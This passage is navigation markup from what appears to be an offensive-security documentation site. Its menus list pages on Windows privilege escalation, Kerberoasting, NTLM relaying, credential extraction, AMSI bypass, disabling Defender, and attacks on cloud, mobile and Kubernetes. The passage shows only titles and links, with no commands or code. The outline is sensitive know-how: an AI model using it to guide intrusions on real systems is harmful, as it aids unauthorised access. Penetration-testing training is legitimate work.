  
    <li class="md-nav__item">
      <a href="../../initial_access/password_spraying/" class="md-nav__link">
        Password Spraying
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../initial_access/mitm6/" class="md-nav__link">
        Mitm6
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../initial_access/wpad_spoofing/" class="md-nav__link">
        WPAD Spoofing
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
    
  
  
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_13_5" type="checkbox" id="__nav_13_5" checked>
      
      
      
      
        <label class="md-nav__link" for="__nav_13_5">
          Active Directory - Local Privilege Escalation
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Active Directory - Local Privilege Escalation" data-md-level="2">
        <label class="md-nav__title" for="__nav_13_5">
          <span class="md-nav__icon md-icon"></span>
          Active Directory - Local Privilege Escalation
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
    
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
      
      
        
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          Local Privilige Escalation
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        Local Privilige Escalation
      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#basic-enumeration-of-the-system" class="md-nav__link">
    Basic Enumeration of the System
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#1-group-policy-preference" class="md-nav__link">
    1. Group Policy Preference
  </a>
  
    <nav class="md-nav" aria-label="1. Group Policy Preference">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#using-powersploit" class="md-nav__link">
    Using PowerSploit
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#using-metasploit" class="md-nav__link">
    Using Metasploit
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#manually" class="md-nav__link">
    Manually
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#2-services-with-vulnerble-permissions" class="md-nav__link">
    2. Services with Vulnerble Permissions
  </a>
  
    <nav class="md-nav" aria-label="2. Services with Vulnerble Permissions">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#21-insecure-registry-permissions" class="md-nav__link">
    2.1 Insecure Registry Permissions
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#22-insecure-service-permissions" class="md-nav__link">
    2.2 Insecure Service Permissions
  </a>
  
    <nav class="md-nav" aria-label="2.2 Insecure Service Permissions">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#using-powersploit-privesc" class="md-nav__link">
    Using PowerSploit - Privesc
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#using-accesschkexe" class="md-nav__link">
    Using accesschk.exe
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#manually_1" class="md-nav__link">
    Manually
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#23-insecure-service-filefolder-permissions" class="md-nav__link">
    2.3 Insecure Service File/folder permissions
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#powersploit-privescpowerup" class="md-nav__link">
    PowerSploit Privesc/PowerUp
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#3-unquoted-service-paths" class="md-nav__link">
    3. Unquoted Service Paths
  </a>
  
    <nav class="md-nav" aria-label="3. Unquoted Service Paths">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#exploit-with-powersploit" class="md-nav__link">
    Exploit with PowerSploit
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#manually_2" class="md-nav__link">
    Manually
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#4-alwaysinstallelevated-install-new-program-as-privileged-user" class="md-nav__link">
    4. AlwaysInstallElevated - Install new program as privileged user
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#5-dll-hijacking" class="md-nav__link">
    5. DLL Hijacking
  </a>
  
    <nav class="md-nav" aria-label="5. DLL Hijacking">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#run-it-locally" class="md-nav__link">
    Run it locally
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#check-the-executable-and-check-for-loadlibrary-functions" class="md-nav__link">
    Check the executable and check for LoadLibrary functions.
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#6-check-installed-software-for-exploits" class="md-nav__link">
    6. Check installed software for exploits
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#7-cleartext-passwords-stored-credentials" class="md-nav__link">
    7. Cleartext Passwords / Stored credentials
  </a>
  
    <nav class="md-nav" aria-label="7. Cleartext Passwords / Stored credentials">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#search-for-them" class="md-nav__link">
    Search for them
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#in-common-files" class="md-nav__link">
    In Common Files
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#in-registry" class="md-nav__link">
    In Registry
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#check-browser-creds" class="md-nav__link">
    Check browser creds
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#8-kernel-exploits" class="md-nav__link">
    8. Kernel exploits
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#service-only-available-from-inside" class="md-nav__link">
    Service only available from inside
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#vulnerable-drivers" class="md-nav__link">
    Vulnerable Drivers
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#hot-potato" class="md-nav__link">
    Hot potato
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#scheduled-tasks-only-works-on-windows-2000xp2003" class="md-nav__link">
    Scheduled Tasks - Only works on Windows 2000/xp/2003
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#escalate-to-system-from-administrator" class="md-nav__link">
    Escalate to SYSTEM from Administrator
  </a>
  
    <nav class="md-nav" aria-label="Escalate to SYSTEM from Administrator">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#on-windows-xp-and-older" class="md-nav__link">
    On Windows XP and Older
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#vista-and-newer" class="md-nav__link">
    Vista and Newer
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#kitrap" class="md-nav__link">
    Kitrap
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#using-metasploit_1" class="md-nav__link">
    Using Metasploit
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#post-modules" class="md-nav__link">
    Post modules
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#references" class="md-nav__link">
    References
  </a>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../shutdown_windows_defender/" class="md-nav__link">
        Disable Windows Defender
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_13_6" type="checkbox" id="__nav_13_6" >
      
      
      
      
        <label class="md-nav__link" for="__nav_13_6">
          Active Directory - Domain Privilege Escalation
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Active Directory - Domain Privilege Escalation" data-md-level="2">
        <label class="md-nav__title" for="__nav_13_6">
          <span class="md-nav__icon md-icon"></span>
          Active Directory - Domain Privilege Escalation
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../active_directory_privilege_escalation/abusing_constrained_delegation/" class="md-nav__link">
        Abusing Constrained Delegation
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../active_directory_privilege_escalation/abusing_unconstrained_delegation/" class="md-nav__link">
        Abusing Unconstrained Delegation
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../active_directory_privilege_escalation/check_for_insecure_usage_of_high_privileged_accounts/" class="md-nav__link">
        Check for Insecure Usage of High Privileged Accounts
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../active_directory_privilege_escalation/check_for_local_admin_privileges/" class="md-nav__link">
        Check for Local Admin Privileges
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../active_directory_privilege_escalation/check_for_misconfgured_access_control_of_mssql/" class="md-nav__link">
        Check for Misconfgured Access Control of MSSQL
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../active_directory_privilege_escalation/check_for_misconfigured_gpo/" class="md-nav__link">
        Check for Misconfigured GPO
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../active_directory_privilege_escalation/check_for_reuse_of_local_admin_password/" class="md-nav__link">
        Check for Reuse of Local Admin Password
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../active_directory_privilege_escalation/check_for_unsupported_os/" class="md-nav__link">
        Check for Unsupported OS
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../active_directory_privilege_escalation/kerberoasting/" class="md-nav__link">
        Kerberos TGS Service Ticket Cracking (Kerberoast)
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../active_directory_privilege_escalation/execssive_amount_of_domain_admins/" class="md-nav__link">
        Excessive Amount of Domain Admins
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../active_directory_privilege_escalation/incorrectly_configured_forest_or_domain_trust/" class="md-nav__link">
        Incorrectly Configured Forest or Domain Trust
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../active_directory_privilege_escalation/misconfigured_access_control_lists/" class="md-nav__link">
        Misconfigured Access Control Lists
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../active_directory_privilege_escalation/passwords_in_active_directory_attributes/" class="md-nav__link">
        Passwords in Active Directory Attributes
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../active_directory_privilege_escalation/smb_shares_mining/" class="md-nav__link">
        SMB Shares Mining
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../active_directory_privilege_escalation/ntlm_relaying_and_theft/" class="md-nav__link">
        NTLM Relaying and Theft
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../active_directory_privilege_escalation/credential_extraction/" class="md-nav__link">
        Credential Extraction (LSASS/SAM)
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../active_directory_privilege_escalation/check_for_lockout_threshold/" class="md-nav__link">
        Check for Lockout Policy
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../active_directory_privilege_escalation/check_for_scripts_on_sysvol/" class="md-nav__link">
        Check for Scripts in SYSVOL
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../active_directory_privilege_escalation/check_for_writable_executables_on_shares/" class="md-nav__link">
        Check for Writable Executables in Shares
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../active_directory_privilege_escalation/aseproasting/" class="md-nav__link">
        AS-REP roasting
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../active_directory_privilege_escalation/check_for_misconfigured_laps/" class="md-nav__link">
        Misconfigured LAPS
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../active_directory_privilege_escalation/misconfigured_read_only_domain_controller/" class="md-nav__link">
        Misconfigured RODC
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../active_directory_privilege_escalation/passwords_in_group_policy_preferences/" class="md-nav__link">
        Password in GPO
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../attacking_windows_domain_domain_trust/" class="md-nav__link">
        Attacking Domain Trust
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../domain_privilege_escalation_checklist/" class="md-nav__link">
        Domain Privilege Escalation Checklist
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../active_directory_privilege_escalation/template/" class="md-nav__link">
        Template
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_13_7" type="checkbox" id="__nav_13_7" >
      
      
      
      
        <label class="md-nav__link" for="__nav_13_7">
          Active Directory - Remote Access
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Active Directory - Remote Access" data-md-level="2">
        <label class="md-nav__title" for="__nav_13_7">
          <span class="md-nav__icon md-icon"></span>
          Active Directory - Remote Access
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../remote_access/remote_access/" class="md-nav__link">
        Remote Access
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_13_8" type="checkbox" id="__nav_13_8" >
      
      
      
      
        <label class="md-nav__link" for="__nav_13_8">
          Active Directory - Cracking Hashes
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Active Directory - Cracking Hashes" data-md-level="2">
        <label class="md-nav__title" for="__nav_13_8">
          <span class="md-nav__icon md-icon"></span>
          Active Directory - Cracking Hashes
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../cracking_hashes/cracking_hashes/" class="md-nav__link">
        Cracking Hashes
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../cracking_hashes/generate_password_list/" class="md-nav__link">
        Generate Password List
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_13_9" type="checkbox" id="__nav_13_9" >
      
      
      
      
        <label class="md-nav__link" for="__nav_13_9">
          Active Directory - Powershell
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Active Directory - Powershell" data-md-level="2">
        <label class="md-nav__title" for="__nav_13_9">
          <span class="md-nav__icon md-icon"></span>
          Active Directory - Powershell
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../powershell/basics_of_powershell/" class="md-nav__link">
        Basics of Powershell
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../powershell/activedirectory/" class="md-nav__link">
        Active Directory
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../powershell/jit_csharp_compilation/" class="md-nav__link">
        JIT CSharp Compilation
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../powershell/local_machine_recon/" class="md-nav__link">
        Local Machine Recon
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../powershell/networking/" class="md-nav__link">
        Networking
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../powershell/running_program_as_user_without_guiinteraction/" class="md-nav__link">
        Running Program as User Without GUI Interaction
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../powershell/amsi_bypass/" class="md-nav__link">
        AMSI Bypass
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../attacking_windows_domain_local_privilege_escalation/" class="md-nav__link">
        Local Privilige Escalation
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_14" type="checkbox" id="__nav_14" >
      
      
      
      
        <label class="md-nav__link" for="__nav_14">
          Attacking Mobile Application
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Attacking Mobile Application" data-md-level="1">
        <label class="md-nav__title" for="__nav_14">
          <span class="md-nav__icon md-icon"></span>
          Attacking Mobile Application
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_14_1" type="checkbox" id="__nav_14_1" >
      
      
      
      
        <label class="md-nav__link" for="__nav_14_1">
          Android
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Android" data-md-level="2">
        <label class="md-nav__title" for="__nav_14_1">
          <span class="md-nav__icon md-icon"></span>
          Android
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../attacking_mobile_applications/android/mobile_application_setup/" class="md-nav__link">
        Android Testing Environment Setup
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../attacking_mobile_applications/android/android_tools/" class="md-nav__link">
        Tools
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../attacking_mobile_applications/android/mobile_application_vulnerabilities_android/" class="md-nav__link">
        Vulnerabilities
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../attacking_mobile_applications/android/android_vuln_checklist/" class="md-nav__link">
        Checklist
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_14_2" type="checkbox" id="__nav_14_2" >
      
      
      
      
        <label class="md-nav__link" for="__nav_14_2">
          IOS
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="IOS" data-md-level="2">
        <label class="md-nav__title" for="__nav_14_2">
          <span class="md-nav__icon md-icon"></span>
          IOS
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../attacking_mobile_applications/ios/ios_setup/" class="md-nav__link">
        IOS Testing Environment Setup
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../attacking_mobile_applications/ios/ios_application_vulnerabilities/" class="md-nav__link">
        Vulnerabilities
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../attacking_mobile_applications/ios/ios_vuln_checklist/" class="md-nav__link">
        Vulnerabilities Checklist
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_15" type="checkbox" id="__nav_15" >
      
      
      
      
        <label class="md-nav__link" for="__nav_15">
          Attacking Wifi
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Attacking Wifi" data-md-level="1">
        <label class="md-nav__title" for="__nav_15">
          <span class="md-nav__icon md-icon"></span>
          Attacking Wifi
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../attacking_wifi/wifi_network_segmentation/" class="md-nav__link">
        Testing Network Segmentation
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../attacking_wifi/wifi/" class="md-nav__link">
        Testing Wifi Security
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_16" type="checkbox" id="__nav_16" >
      
      
      
      
        <label class="md-nav__link" for="__nav_16">
          Attacking Thick Client
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Attacking Thick Client" data-md-level="1">
        <label class="md-nav__title" for="__nav_16">
          <span class="md-nav__icon md-icon"></span>
          Attacking Thick Client
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../attacking_thick_client/attacking_thick_client/" class="md-nav__link">
        Attacking Thick Client
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_17" type="checkbox" id="__nav_17" >
      
      
      
      
        <label class="md-nav__link" for="__nav_17">
          Attacking Cloud Environment
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Attacking Cloud Environment" data-md-level="1">
        <label class="md-nav__title" for="__nav_17">
          <span class="md-nav__icon md-icon"></span>
          Attacking Cloud Environment
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_17_1" type="checkbox" id="__nav_17_1" >
      
      
      
      
        <label class="md-nav__link" for="__nav_17_1">
          Azure
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Azure" data-md-level="2">
        <label class="md-nav__title" for="__nav_17_1">
          <span class="md-nav__icon md-icon"></span>
          Azure
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../attacking_cloud_environment/attacking_azure/abuse_application_administrator_role/" class="md-nav__link">
        Abuse Application Administrator Role
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../attacking_cloud_environment/attacking_azure/abuse_azure_ad_sso/" class="md-nav__link">
        Abuse Azure AD SSO
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../attacking_cloud_environment/attacking_azure/check_for_blobs/" class="md-nav__link">
        Check for Blobs
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../attacking_cloud_environment/attacking_azure/check_for_misconfigured_azuread_groups/" class="md-nav__link">
        Check for Misconfigured AzureAD groups
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../attacking_cloud_environment/attacking_azure/check_for_passwords_azure/" class="md-nav__link">
        Check for Passwords Azure
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../attacking_cloud_environment/attacking_azure/check_for_sso_enabled_services/" class="md-nav__link">
        Check for SSO Enabled Services
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../attacking_cloud_environment/attacking_azure/password_hash_syncronization/" class="md-nav__link">
        Password Hash Syncronization
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../attacking_cloud_environment/attacking_azure/password_spraying/" class="md-nav__link">
        Password Spraying
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../attacking_cloud_environment/attacking_azure/passwords_in_active_directory_attribute/" class="md-nav__link">
        Password in Active Directory Attribute
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../attacking_cloud_environment/attacking_azure/recon/" class="md-nav__link">
        Recon
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_18" type="checkbox" id="__nav_18" >
      
      
      
      
        <label class="md-nav__link" for="__nav_18">
          Attacking Kubernetes
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Attacking Kubernetes" data-md-level="1">
        <label class="md-nav__title" for="__nav_18">
          <span class="md-nav__icon md-icon"></span>
          Attacking Kubernetes
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../attacking_kubernetes/basics_of_kubernetes/" class="md-nav__link">
        Basics of Kubernetes
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../attacking_kubernetes/basics_of_docker/" class="md-nav__link">
        Basics of Docker
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../attacking_kubernetes/kubernetes_hacking_tools/" class="md-nav__link">
        Setting Up Tools
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../attacking_kubernetes/attacking_kubernetes/" class="md-nav__link">
        Attacking Kubernetes
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../attacking_kubernetes/attacking_kubernetes_checklist/" class="md-nav__link">
        Attacking Kubernetes Checklist
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_19" type="checkbox" id="__nav_19" >
      
      
      
      
        <label class="md-nav__link" for="__nav_19">
          Attacking RFID Cards
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Attacking RFID Cards" data-md-level="1">
        <label class="md-nav__title" for="__nav_19">
          <span class="md-nav__icon md-icon"></span>
          Attacking RFID Cards
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../attacking_rfid_cards/basics_of_rfid_hacking/" class="md-nav__link">
        Basics of RFID Hacking
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_20" type="checkbox" id="__nav_20" >
      
      
      
      
        <label class="md-nav__link" for="__nav_20">
          Physical Attacks
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Physical Attacks" data-md-level="1">
        <label class="md-nav__title" for="__nav_20">
          <span class="md-nav__icon md-icon"></span>
          Physical Attacks
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../physical_attacks/physical_access_to_machine/" class="md-nav__link">
        Pysical Attacks
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_21" type="checkbox" id="__nav_21" >
      
      
      
      
        <label class="md-nav__link" for="__nav_21">
          Password Cracking
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Password Cracking" data-md-level="1">
        <label class="md-nav__title" for="__nav_21">
          <span class="md-nav__icon md-icon"></span>
          Password Cracking
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../password_cracking/offline_password_cracking/" class="md-nav__link">
        Offline Password Cracking
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../password_cracking/online_password_cracking/" class="md-nav__link">
        Online Password Cracking (Brute force)
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../password_cracking/generate_password_list/" class="md-nav__link">
        Generate Password List
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../password_cracking/generate_custom_wordlist/" class="md-nav__link">
        Generate Custom Password List
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_22" type="checkbox" id="__nav_22" >
      
      
      
      
        <label class="md-nav__link" for="__nav_22">
          Cryptography
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Cryptography" data-md-level="1">
        <label class="md-nav__title" for="__nav_22">
          <span class="md-nav__icon md-icon"></span>
          Cryptography
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
